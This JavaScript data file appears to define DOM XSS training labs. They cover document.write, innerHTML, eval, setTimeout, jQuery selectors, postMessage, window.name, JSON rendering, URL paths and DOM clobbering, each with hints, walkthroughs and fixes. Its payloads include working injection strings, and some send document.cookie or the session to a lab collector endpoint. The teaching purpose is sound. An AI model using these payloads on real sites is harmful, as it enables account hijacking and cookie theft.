export const DOM = [
  {
    id: 'dom-document-write',
    title: 'DOM XSS through document.write and the URL fragment',
    category: 'dom',
    difficulty: 'apprentice',
    app: 'PixelPress',
    tags: ['document.write', 'location.hash', 'client-side'],
    summary: 'The page writes the URL fragment into the document with document.write. Nothing is sent to the server, so a WAF never sees the payload.',
    scenario:
      'PixelPress has a "search highlight" feature that reads location.hash and echoes it into the page with document.write. Because hash fragments are never transmitted to the server, no server-side filter, WAF or access log can see the payload — the entire vulnerability lives in the browser.',
    goal: 'Execute JavaScript through the fragment, then explain why the server logs show nothing.',
    hints: [
      'Everything after # is client-side only. It never appears in an HTTP request.',
      'The sink is document.write, which feeds the string straight to the HTML parser.',
      'There is a form under the page that sets the fragment and reloads for you.',
    ],
    payloads: [
      { label: 'Fragment payload', code: '#<img src=x onerror=alert(document.domain)>' },
      { label: 'Script tag variant', code: '#<script>alert(document.domain)</script>' },
      { label: 'SVG variant', code: '#<svg onload=alert(document.domain)>' },
    ],
    walkthrough: [
      { t: 'Find the sink', d: 'The page runs: document.write("<h1>You searched for " + decodeURIComponent(location.hash.slice(1)) + "</h1>").' },
      { t: 'Confirm it is client-side', d: 'The lab\'s request log shows the URL without the fragment. A server-side filter can never fix this bug.' },
      { t: 'Inject', d: 'Use the "set fragment" form with `<img src=x onerror=alert(document.domain)>`; the handler fires because document.write parses it as markup.' },
      { t: 'Understand reach', d: 'Victim opens a link you sent. The browser never sends the fragment to the server, so nothing logs it — and the script runs with full DOM access.' },
    ],
    why:
      'DOM XSS happens when client-side JavaScript takes attacker-controlled data (hash, query, name, postMessage, storage) and passes it to a dangerous sink (innerHTML, document.write, eval, location). No server round trip is involved, so server-side defences are structurally blind to it.',
    fix: {
      text: 'Never pass URL data to HTML sinks. Use textContent, createElement and setAttribute; if HTML is unavoidable, sanitise with DOMPurify. Allowlist what the fragment may contain.',
      code: "// vulnerable\ndocument.write('<h1>You searched for ' + location.hash.slice(1) + '</h1>');\n\n// fixed\nconst h = document.createElement('h1');\nh.textContent = 'You searched for ' + decodeURIComponent(location.hash.slice(1));\ndocument.body.append(h);",
    },
  },
  {
    id: 'dom-innerhtml',
    title: 'DOM XSS through innerHTML from a query parameter',
    category: 'dom',
    difficulty: 'apprentice',
    app: 'Greenleaf Store',
    tags: ['innerHTML', 'URLSearchParams', 'client-side'],
    summary: 'A "welcome back" banner takes ?name= and assigns it to innerHTML — the most common DOM sink in modern front-ends.',
    scenario:
      'Greenleaf\'s storefront thanks returning shoppers by name: const name = new URLSearchParams(location.search).get("name"); banner.innerHTML = "Welcome back, " + name. The server never sees the name echoed anywhere, so every server-side test passes.',
    goal: 'Execute JavaScript through the name parameter.',
    hints: [
      'Look at the page\'s own script — the value comes from the query string, not from server HTML.',
      'innerHTML parses its argument as markup; a broken image plus onerror is enough.',
      'The lab form sets ?name= and reloads so you can iterate quickly.',
    ],
    payloads: [
      { label: 'Broken image', code: '<img src=x onerror=alert(document.domain)>' },
      { label: 'Alternative', code: '<svg/onload=alert(document.domain)>' },
      { label: 'Formatted as a URL', code: '?name=<img src=x onerror=alert(document.domain)>' },
    ],
    walkthrough: [
      { t: 'Read the sink', d: 'The banner element is filled with innerHTML using a value read from URLSearchParams.' },
      { t: 'Send the payload', d: 'Enter the img payload into the "name" box. The page navigates to ?name=<img src=x onerror=alert(document.domain)>. ' },
      { t: 'Watch it fire', d: 'innerHTML parses the string, the image fails to load, onerror runs.' },
      { t: 'Check the server log', d: 'The request contains only the query string, and the server echoes nothing. Any fix has to happen at the sink.' },
    ],
    why:
      'innerHTML (like outerHTML, insertAdjacentHTML, document.write and jQuery\'s .html()) parses strings as HTML. It is not injection-safe with untrusted data, no matter how much the server "validated" the input earlier.',
    fix: {
      text: 'Use textContent for text. If you need markup, build nodes with createElement/textContent, or sanitise with DOMPurify before assigning.',
      code: "// vulnerable\nbanner.innerHTML = 'Welcome back, ' + name;\n\n// fixed\nbanner.textContent = 'Welcome back, ' + name;\n\n// if markup is required\nbanner.innerHTML = DOMPurify.sanitize(untrusted);",
    },
  },
  {
    id: 'dom-eval',
    title: 'DOM XSS through eval()',
    category: 'dom',
    difficulty: 'practitioner',
    app: 'Nimbus Support',
    tags: ['eval', 'code execution', 'client-side'],
    summary: 'A debug helper runs whatever is in the URL fragment with eval(). Here the "XSS" is literally arbitrary JavaScript execution.',
    scenario:
      'A leftover debugger on the Nimbus status page reads location.hash and passes it to eval() so engineers can run snippets from a bookmark. eval turns any string into code: there is no escaping rule that makes this safe with untrusted input.',
    goal: 'Run code through the fragment. Note that no HTML injection is involved at all.',
    hints: [
      'From # onward the browser does not parse HTML here — eval does not care about tags.',
      'Pass a JavaScript expression, not markup.',
      'The form sets the fragment and reloads the page.',
    ],
    payloads: [
      { label: 'Direct call', code: '#alert(document.domain)' },
      { label: 'Reading secrets', code: '#fetch("/api/attack/log?lab=dom-eval&src=eval&d="+encodeURIComponent(document.cookie))' },
      { label: 'Obfuscated equivalent', code: '#(0,eval)("ale"+"rt(document.domain)")' },
    ],
    walkthrough: [
      { t: 'Confirm the sink', d: 'The page calls eval(location.hash.slice(1)) on load. Any JavaScript you put in the fragment runs.' },
      { t: 'Send code', d: 'Set the fragment to alert(document.domain). The alert runs immediately.' },
      { t: 'Escalate', d: 'Because this is real code execution, you can read document.cookie, rewrite the DOM, or make same-origin requests — far more powerful than an HTML injection.' },
      { t: 'Reflect on detection', d: 'Payloads contain no angle brackets, so HTML-focused filters and many WAF rules never match them.' },
    ],
    why:
      'eval, new Function, setTimeout/setInterval with a string, and script injection through src all convert strings to code. When the string is attacker-controlled, the attacker writes the program — escaping HTML is irrelevant because HTML is not the parser being abused.',
    fix: {
      text: 'Remove eval from production code. If you need to run a named operation, use an allowlist map of functions. Use JSON.parse for data, never eval.',
      code: "// vulnerable\neval(location.hash.slice(1));\n\n// fixed: allowlisted operations\nconst ops = { reload: () => location.reload(), status: () => renderStatus() };\nconst op = new URLSearchParams(location.search).get('op');\n(ops[op] || (() => {}))();",
    },
  },
  {
    id: 'dom-settimeout',
    title: 'DOM XSS through setTimeout with a string',
    category: 'dom',
    difficulty: 'apprentice',
    app: 'PixelPress',
    tags: ['setTimeout', 'string argument', 'client-side'],
    summary: 'setTimeout accepts a string and evaluates it like code. A countdown widget passes the URL fragment straight in.',
    scenario:
      'PixelPress animates a newsletter countdown with setTimeout(setupCode, 100), where setupCode comes from the fragment so the marketing team can tweak it per campaign. Passing a string to setTimeout is an eval in disguise.',
    goal: 'Execute code through the timer argument.',
    hints: [
      'No HTML is parsed here: the string is handed to the JavaScript parser.',
      'Any expression works — the timer calls it after the delay.',
      'Set the fragment with the form and wait for the timer.',
    ],
    payloads: [
      { label: 'Payload', code: '#alert(document.domain)' },
      { label: 'Delayed exfil', code: '#fetch("/api/attack/log?lab=dom-settimeout&src=timer&d="+encodeURIComponent(document.cookie))' },
    ],
    walkthrough: [
      { t: 'Read the code', d: 'The page runs setTimeout(decodeURIComponent(location.hash.slice(1)), 100).' },
      { t: 'Set the fragment', d: 'Use the form to set alert(document.domain); the page reloads and the timer fires.' },
      { t: 'Explain why it counts as XSS', d: 'It is script injection into the page context: the attacker chooses code, not just text. Some tools classify it as eval-injection rather than HTML injection — same impact.' },
    ],
    why:
      'The dangerous feature is "string treated as code". setTimeout with a function is safe; with a string it behaves like eval. The same applies to setInterval and Function().',
    fix: {
      text: 'Always pass a function to timers. Never build code strings from data.',
      code: "// vulnerable\nsetTimeout(location.hash.slice(1), 100);\n\n// fixed\nsetTimeout(() => tick(), 100);",
    },
  },
  {
    id: 'dom-selector',
    title: 'DOM XSS through a jQuery-style selector sink',
    category: 'dom',
    difficulty: 'practitioner',
    app: 'Greenleaf Store',
    tags: ['selector', 'jQuery', 'HTML detection'],
    summary: 'Passing location.hash to $() makes jQuery create elements when the string starts with "<" — the classic selector sink.',
    scenario:
      'A theme script does $("#" + location.hash.slice(1)) to scroll to an anchor. jQuery treats strings that look like HTML as HTML and builds the elements, which fires handlers during construction. This still affects a large amount of legacy front-end code.',
    goal: 'Get execution through the selector call without any obvious innerHTML in the app.',
    hints: [
      'jQuery\'s $() has two modes: selector, or HTML string when it starts with <.',
      'This lab ships a tiny lookalike of that behaviour so you can see the exact rule.',
      'Start your fragment with a < character.',
    ],
    payloads: [
      { label: 'HTML string instead of an id', code: '#<img src=x onerror=alert(document.domain)>' },
      { label: 'Another element', code: '#<style>@keyframes x{}</style><svg onload=alert(document.domain)>' },
    ],
    walkthrough: [
      { t: 'Inspect the call', d: 'The page calls $(location.hash.slice(1)) then appends the result to the page.' },
      { t: 'Abuse the HTML branch', d: 'A fragment starting with < is not a selector: the library parses it as HTML, creating a real img element whose onerror fires while the image loads.' },
      { t: 'Fire it', d: 'Set the fragment to <img src=x onerror=alert(document.domain)>.' },
      { t: 'Generalise', d: 'The same rule applies to jQuery\'s .html(), .append(), .before() and $(html) — all are HTML sinks even when the code looks like a selector lookup.' },
    ],
    why:
      'Pseudo-selectors are sinks. When a library decides "this string looks like HTML", the parser opens elements and event handlers run. Data must never be concatenated into a selector at all — use document.getElementById or querySelector with encoded, validated values.',
    fix: {
      text: 'Never concatenate untrusted data into a selector. Use getElementById (which does not parse HTML) or an attribute-based lookup with escaping, and prefer textContent when rendering data.',
      code: "// vulnerable\n$(location.hash.slice(1)).appendTo('#out');\n\n// fixed\nconst id = location.hash.slice(1);\nif (/^[\\w-]{1,64}$/.test(id)) {\n  const el = document.getElementById(id);\n  if (el) el.scrollIntoView();\n}",
    },
  },
  {
    id: 'dom-postmessage',
    title: 'DOM XSS through postMessage with no origin check',
    category: 'dom',
    difficulty: 'practitioner',
    app: 'Nimbus Chat',
    tags: ['postMessage', 'origin check', 'third-party widget'],
    summary: 'The page renders any message it receives into innerHTML and never checks event.origin. Any window can send it.',
    scenario:
      'Nimbus Chat renders incoming chat payloads with innerHTML. The listener is written as window.addEventListener("message", e => box.innerHTML = e.data) with no origin allowlist. Any site that can get a reference to this window — an embed, an opened popup, an iframe — can send arbitrary HTML.',
    goal: 'Send a message from the simulated third-party widget and get script execution.',
    hints: [
      'The listener writes e.data into innerHTML and never looks at e.origin.',
      'Use the "third-party widget" panel on the right of the lab — it posts to the parent window from a different context.',
      'Check what origin the message arrives with: in a sandboxed frame it is "null", which is exactly why an allowlist is needed.',
    ],
    payloads: [
      { label: 'Message body to send', code: '<img src=x onerror=alert(document.domain)>' },
      { label: 'What a malicious page sends', code: "targetWindow.postMessage('<img src=x onerror=alert(document.domain)>', '*')" },
    ],
    walkthrough: [
      { t: 'Read the listener', d: 'window.addEventListener("message", e => { box.innerHTML = e.data; }) — no origin check.' },
      { t: 'Use the widget', d: 'Type the payload into the widget\'s message box and press send. It calls parent.postMessage(payload, "*").' },
      { t: 'Observe execution', d: 'The chat window renders the message as HTML and the handler fires.' },
      { t: 'Write the real attack', d: 'Attacker hosts a page that frames or opens the target, keeps a reference, and posts the payload after load. The victim never notices.' },
    ],
    why:
      'postMessage crosses origin boundaries by design, so the receiver must enforce trust. Without event.origin validation (and a check on event.source), every origin is a valid sender. Combined with an HTML sink the receiver becomes a public injection point.',
    fix: {
      text: 'Allowlist sender origins, validate the message shape, and render with textContent. Check event.source against the expected window when possible.',
      code: "window.addEventListener('message', (e) => {\n  if (e.origin !== 'https://chat.example.com') return;\n  if (typeof e.data !== 'object' || typeof e.data.text !== 'string') return;\n  box.textContent = e.data.text;   // never innerHTML\n});",
    },
  },
  {
    id: 'dom-windowname',
    title: 'DOM XSS through window.name',
    category: 'dom',
    difficulty: 'practitioner',
    app: 'Greenleaf Store',
    tags: ['window.name', 'cross-origin persistence', 'client-side'],
    summary: 'window.name survives navigation across origins. A partner widget reads it and writes it into the page as HTML.',
    scenario:
      'Greenleaf\'s "return to store" widget restores state with document.write(window.name). window.name is attacker-controlled by any page the user visited before: it persists across navigations, even across origins, and is not cleared on navigation.',
    goal: 'Set window.name from the "attacker page" step, navigate to the partner page, and fire the payload there.',
    hints: [
      'window.name belongs to the browsing context (tab/frame), not to the document. It survives navigation.',
      'The lab gives you step 1 (attacker page) and step 2 (the vulnerable partner page) in one frame.',
      'Any HTML you put in window.name is rendered by the partner page.',
    ],
    payloads: [
      { label: 'Value for window.name', code: '<img src=x onerror=alert(document.domain)>' },
      { label: 'What the attacker page does', code: "window.name = '<img src=x onerror=alert(document.domain)>';\nlocation = 'https://partner.example/store';" },
    ],
    walkthrough: [
      { t: 'Read step 2', d: 'The partner page runs document.write(window.name) into a "restored session" panel.' },
      { t: 'Set the value', d: 'In step 1, enter the img payload. The page stores it in window.name and navigates to the partner page — a model of the real cross-origin hop.' },
      { t: 'Watch it fire', d: 'The partner page reads the value it believes belongs to its own state and parses it as HTML.' },
      { t: 'Note the quirk', d: 'Modern browsers still preserve window.name across navigations. Browsers now partition or clear some of it, so validate instead of relying on that.' },
    ],
    why:
      'Storing data in a place that outlives the document (window.name, sessionStorage in some flows, fragment, referrer) lets one origin hand data to another. If the receiver trusts that data as HTML, the hand-off is an injection primitive.',
    fix: {
      text: 'Treat window.name as untrusted input. Render with textContent, or store state in the URL/backend instead. Never document.write a value you did not construct.',
      code: "// vulnerable\ndocument.write(window.name);\n\n// fixed\nconst el = document.getElementById('restored');\nel.textContent = window.name || '';",
    },
  },
  {
    id: 'dom-json',
    title: 'DOM XSS in client-side rendering of API JSON',
    category: 'dom',
    difficulty: 'practitioner',
    app: 'Nimbus Support',
    tags: ['JSON', 'client-side rendering', 'stored'],
    summary: 'Notifications are fetched as JSON and rendered by client-side JavaScript with innerHTML. The server never builds HTML, yet the page is stored-XSS-able.',
    scenario:
      'Nimbus renders a notification centre in the browser: fetch("/api/notifications") returns JSON, then each entry is appended with innerHTML. Teams often assume "we return JSON, so we cannot have XSS" — but the browser is the renderer now, and JSON is just a carrier.',
    goal: 'Store a notification whose text executes every time the notification centre loads.',
    hints: [
      'Submit a notification and watch how the panel renders it.',
      'The API returns application/json — the injection happens when JavaScript inserts the string into the DOM.',
      'Keep the same payload shape as the other HTML sinks.',
    ],
    payloads: [
      { label: 'Notification text', code: '<img src=x onerror=alert(document.domain)>' },
      { label: 'Look at the API yourself', code: '/lab/dom-json/api' },
    ],
    walkthrough: [
      { t: 'Store a notification', d: 'Submit "hello" and watch the notification centre re-render from the API.' },
      { t: 'Inspect the API', d: 'The endpoint returns a JSON array. Nothing dangerous there — the risk is entirely in the consumer.' },
      { t: 'Inject', d: 'Submit the img payload; the client-side renderer assigns it with innerHTML and the handler fires on every load.' },
      { t: 'Map it to modern stacks', d: 'The same pattern exists in React with dangerouslySetInnerHTML, Vue v-html, Angular bypassSecurityTrustHtml and any hand-rolled template that concatenates strings.' },
    ],
    why:
      'Separating client and server does not separate trust. When the client renders strings from an API with an HTML sink, the API response becomes the injection vector, and the sink is whatever the front-end used.',
    fix: {
      text: 'Render with text nodes, or sanitise at the sink. Enforce it in code review: innerHTML, v-html and dangerouslySetInnerHTML with non-constant data are findings.',
      code: "// vulnerable\nlist.innerHTML += `<li>${n.text}</li>`;\n\n// fixed\nconst li = document.createElement('li');\nli.textContent = n.text;\nlist.append(li);",
    },
  },
  {
    id: 'dom-urlpath',
    title: 'DOM XSS through the URL path in a router',
    category: 'dom',
    difficulty: 'practitioner',
    app: 'Nimbus Docs',
    tags: ['path', 'router', 'decodeURIComponent'],
    summary: 'A hash-less SPA router splits location.pathname and injects the segment as HTML. The server happily routes the request to the app.',
    scenario:
      'Nimbus Docs resolves /docs/<slug> on the client: it splits location.pathname, decodes the segment and writes it into a breadcrumb with innerHTML. Because the server treats the path as a normal route, the request looks innocuous in logs — the payload is in the path, not the query.',
    goal: 'Execute JavaScript through the path segment.',
    hints: [
      'The route is /lab/dom-urlpath/<your value>. The app writes that segment into the breadcrumb.',
      'URL-encode the payload so the path stays a single segment: %3C is <.',
      'The form in the lab builds the URL for you.',
    ],
    payloads: [
      { label: 'Path segment, URL-encoded', code: '%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E' },
      { label: 'Full URL', code: '/lab/dom-urlpath/%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E' },
    ],
    walkthrough: [
      { t: 'Find the segment', d: 'Open a normal document URL: the breadcrumb shows the slug from the path.' },
      { t: 'Encode the payload', d: 'A path cannot contain a raw <, so encode it: %3Cimg%20src%3Dx...%3E. The router decodes before rendering.' },
      { t: 'Fire it', d: 'Use the form or paste the URL; the breadcrumb innerHTML parses your element and onerror runs.' },
      { t: 'Think about routing layers', d: 'Reverse proxies, CDNs and access logs normalise or truncate paths, so path-based payloads are under-reported by monitoring.' },
    ],
    why:
      'Any URL component can carry a payload: path, query, fragment, matrix params, headers that end up in the DOM (Sec-Fetch, Referer), and even the port or host in some deployments. Client routers must treat every segment as untrusted.',
    fix: {
      text: 'Validate route parameters against an allowlist pattern before rendering, and render with textContent. Treat decoding as the last step before display, not as sanitisation.',
      code: "const seg = location.pathname.split('/')[3] || '';\nif (!/^[a-z0-9-]{1,64}$/i.test(seg)) return renderNotFound();\ncrumbs.textContent = decodeURIComponent(seg);",
    },
  },
  {
    id: 'dom-clobbering',
    title: 'DOM clobbering to hijack application config',
    category: 'dom',
    difficulty: 'expert',
    app: 'Nimbus Docs',
    tags: ['DOM clobbering', 'no script needed', 'HTML injection'],
    summary: 'You only get HTML injection with anchor tags allowed. By shadowing the config global with markup, you redirect the app\'s own heartbeat request — session included.',
    scenario:
      'Nimbus Docs lets you set a display name, sanitised to allow only <a> tags ("links are harmless"). A script on the page reads a config global to find its heartbeat endpoint, then posts the session there on load. DOM clobbering lets markup define that global, so you never need JavaScript of your own — the application sends the data for you.',
    goal: 'Without any <script> or on* handler, make the app send its heartbeat — session included — to an endpoint you control, and watch it land in the attacker console.',
    hints: [
      'Browsers expose elements with an id as named properties on window: <a id="x"> creates window.x.',
      'Two elements with the same id become an HTMLCollection, and named descendants are reachable as properties: clobber.x.y.',
      'The app reads window.appConfig, then uses appConfig.url.href as the navigation target. Make appConfig.url be an anchor you control.',
    ],
    payloads: [
      {
        label: 'Clobber window.appConfig.endpoint',
        code: '<a id="appConfig"></a><a id="appConfig" name="endpoint" href="/api/attack/log?lab=dom-clobbering&src=clobbered"></a>',
      },
      {
        label: 'Same trick, labelled differently in the console',
        code: '<a id="appConfig"></a><a id="appConfig" name="endpoint" href="/api/attack/log?lab=dom-clobbering&src=clobbered-2"></a>',
      },
    ],
    walkthrough: [
      { t: 'See what is allowed', d: 'Set the display name to <b>x</b> — stripped. Set it to <a href="/x">x</a> — kept. The sanitiser only allows anchors, so a script tag is out.' },
      { t: 'Read the app code', d: 'The page does: var cfg = window.appConfig || {}; var endpoint = (cfg.endpoint && (cfg.endpoint.href || cfg.endpoint.value)) || "/ping"; then fetch(endpoint + "?d=" + document.cookie).' },
      { t: 'Clobber the global', d: 'Inject two anchors with id="appConfig"; the second carries name="endpoint" and an href pointing at your collector. window.appConfig becomes an HTMLCollection and appConfig.endpoint resolves to your anchor.' },
      { t: 'Watch the heartbeat', d: 'Reload the lab or press “Send heartbeat now”. The application itself fetches your URL with the session attached — the callback appears in the attacker console and the lab marks itself solved.' },
      { t: 'Appreciate the class', d: 'DOM clobbering defeats "we only allow safe tags" sanitizers and is used against analytics, config loaders and third-party scripts that read globals.' },
    ],
    why:
      'HTML element ids and names become properties on window and on forms. A script that trusts window.someConfig can therefore be fed an element instead of an object. The mitigation is to never read configuration from globals that markup can shadow, and to sanitise with a sanitiser that strips id/name (DOMPurify has options for this).',
    fix: {
      text: 'Use a module-scoped config, not window globals. If you must read globals, validate the type (typeof cfg.url === "string") and allowlist the URL scheme. Sanitise injected HTML with id/name stripping enabled.',
      code: "const CONFIG = { url: '/dashboard' };   // module scope, not window\n\n// and validate before navigating\nconst url = new URL(target, location.origin);\nif (!['http:', 'https:'].includes(url.protocol)) return;\nlocation.assign(url.href);",
    },
  },
];
